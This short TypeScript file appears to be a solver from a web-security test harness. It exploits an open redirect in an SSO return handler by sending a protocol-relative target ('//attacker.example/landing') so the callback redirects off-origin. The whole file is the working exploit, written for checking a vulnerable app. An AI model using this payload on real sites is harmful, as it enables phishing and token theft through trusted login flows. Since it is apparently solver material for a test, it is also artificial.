// Open redirect through the SSO return handler: supply a protocol-relative return target so the
// callback 302s to an off-origin host.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const nextParam = ctx.plan.params.nextUrl ?? 'next'
  const path = `${ctx.plan.routes.ssoCallback!.path}?${nextParam}=${encodeURIComponent('//attacker.example/landing')}`
  await ctx.fetch(path, { method: 'GET' })
}
